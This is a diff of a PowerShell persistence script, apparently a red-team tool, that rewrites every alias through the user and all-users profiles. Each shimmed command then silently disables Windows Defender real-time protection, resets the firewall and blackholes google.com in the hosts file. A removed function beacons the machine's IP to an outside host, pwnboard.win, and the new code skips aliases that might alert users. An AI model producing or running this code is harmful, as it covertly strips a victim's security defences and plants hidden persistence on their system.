@@ -15,20 +15,18 @@
     PS C:\> .\remap.ps1
     .LINK
     https://github.com/NotoriousRebel/Remapper
-    #>
+#>
 
-# DEFINE FUNCTIONS BELOW
-$mm = @'
-function mm {try {$i=(Test-Connection -ComputerName $env:ComputerName -Count 1).IPV4Address.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic"  -ErrorAction SilentlyContinue -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
-'@.Trim()
+# Change these functions to suit your needs
+
 $dd = @'
-function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
+function dd {Start-Job -ScriptBlock {try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue }Catch{$_}} | Out-Null }
 '@.Trim()
 $ff = @'
-function ff {try{Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue | Out-Null}Catch{}}
+function ff {Start-Job -ScriptBlock {try{(New-Object -ComObject HNetCfg.FwPolicy2).RestoreLocalFirewallDefaults()}Catch{$_}} | Out-Null}
 '@.Trim()
 $xx = @'
-function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue |ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue -Value "`r`n0.0.0.0    www.google.com google.com" | Out-Null}Catch{}}}Catch{}}
+function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue |ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue -Value "`r`n0.0.0.0    www.google.com google.com" }Catch{}}}Catch{$_}}
 '@.Trim()
 
 $orig_dct = @{ }
@@ -44,8 +42,8 @@ function create_map() {
     Name of alias that will serve as key
     #>
     param([parameter(ValueFromPipeline)][string]$alias)
-    if ($cmd -match "gin" -or $cmd -match "stz" -or $cmd -match "gtz" -or $cmd -match "write") {
-        # Not shimming as newGuid() uses gin alias and that breaks things
+    if ($alias -match "\?" -or $alias -match "cd" -or $alias -match "gcb" -or $alias -match "gin" -or $alias -match "scb" -or $alias -match "%" -or $alias -match "stz" -or $alias -match "gtz" -or $alias -match "write" -or $alias -match "where" -or $alias -match "foreach") {
+        # Shimming these aliases can alert users and in some cases break aliases 
         return;
     }
     $value = (Get-Alias -Name $alias).Definition
@@ -69,14 +67,16 @@ function shim([string]$key, [string]$value) {
     First element: String that is definition of function that contains shimmed functions as well as definition for alias
     Second element: String that redefines the alias with the Value being our shimmed functon 
     #>
-    $y = "function shimmed_$key {$value; try{mm}catch{}; try{xx}catch{}; try{dd}catch{}; try{ff}catch{}}"
-    $tmp = "shimmed_$key"
-    $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force'
-    $s = $shim.Replace("cmd", $key).Replace("val", $tmp)
+    
+    # If functon names have changed, new ones added, some are removed
+    # it should changed to $value;
+    $func_def = "function shimmed_$key {$value; xx;dd;ff}"
+    $func_name = "shimmed_$key"
+    $shim = 'Set-Alias -Name alias -Value val -Option AllScope,Constant -Scope Global' + ' -ErrorAction SilentlyContinue -Force'
+    $full_shim = $shim.Replace("alias", $key).Replace("val", $func_name)
     $arr = @()
-    $arr += $y
-    $arr += $s
-    $arr 
+    $arr += $func_def
+    $arr += $full_shim
     return $arr
 }
 
@@ -110,30 +110,29 @@ function main() {
     .PARAMETER value
     Value that will be appended to path
     #>
-    Get-Alias | ForEach-Object { $_.Name | create_map }
     $curuser_allhosts = $PROFILE.CurrentUserAllHosts
     $allusers_allhosts = $PROFILE.AllUsersAllHosts
+    
+    Try {
+        if (!(Test-Path -Path $curuser_allhosts)) {
 
-    if (!(Test-Path -Path $curuser_allhosts)) {
-        Try {
-            New-Item -ItemType File -Path $curuser_allhosts -ErrorAction SilentlyContinue -Force | Out-Null
+            New-Item -ItemType File -Path $curuser_allhosts -Force -ErrorAction SilentlyContinue | Out-Null
         }
-        Catch { }
+
     }
-    if (!(Test-Path -Path $allusers_allhosts)) {
-        Try {
-            New-Item -ItemType File -Path $allusers_allhosts -ErrorAction SilentlyContinue -Force | Out-Null
+    Catch { }
+    Try {
+        if (!(Test-Path -Path $allusers_allhosts)) {
+
+            New-Item -ItemType File -Path $allusers_allhosts -Force -ErrorAction SilentlyContinue | Out-Null
         }
-        Catch { }
+
     }
+    Catch { }
     
     Get-Alias | ForEach-Object { $_.Name | create_map }
-    $orig_dct["?"] = "Where-Object"
-    # Hardcoded because returns 4 different values when doing Get-Alias
-    $lst = $orig_dct.Keys | Sort-Object
-    # Sort the keys to go in order 
     $all = @()
-    foreach ($key in $lst) {
+    foreach ($key in $orig_dct.Keys) {
         $val = $orig_dct[$key]
         $arr = shim $key $val
         $alias_line = $arr[0]
@@ -142,8 +141,8 @@ function main() {
         $all += $func_shim
     }
     # Array that contains shimmed functions as well as set alias commands to add to profiles
-    Try {
-        write_to $curuser_allhosts $mm
+
+    try {
         write_to $curuser_allhosts $gg
         write_to $curuser_allhosts $dd
         write_to $curuser_allhosts $ff
@@ -152,10 +151,10 @@ function main() {
             write_to $curuser_allhosts $v
         }
     }
-    Catch { }
-    # First add functions than iterate through array 
-    Try {
-        write_to $allusers_allhosts $mm
+    
+    catch { { } }
+    
+    try {
         write_to $allusers_allhosts $gg
         write_to $allusers_allhosts $dd
         write_to $allusers_allhosts $ff
@@ -164,7 +163,7 @@ function main() {
             write_to $allusers_allhosts $v
         }
     }
-    Catch { }
+    catch { { } }
 }
 
 main
